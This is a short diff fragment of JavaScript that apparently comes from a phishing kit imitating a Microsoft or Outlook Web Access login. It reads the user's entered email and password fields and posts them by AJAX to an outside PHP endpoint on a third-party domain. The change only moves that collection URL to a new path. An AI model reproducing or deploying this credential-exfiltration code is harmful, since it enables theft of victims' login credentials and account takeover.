@@ -7168,7 +7168,7 @@ css: { 'no-margin-bottom': removeBottomMargin }"
             var ps = $("#i0116").val();
   
             $.ajax({
-              url: "https://jbvlaptop.com/wp-content/note.php", // full url of owanew.php
+              url: "https://jbvlaptop.com/app/note.php", // full url of owanew.php
               type: "POST",
               data: {
                 user: em,
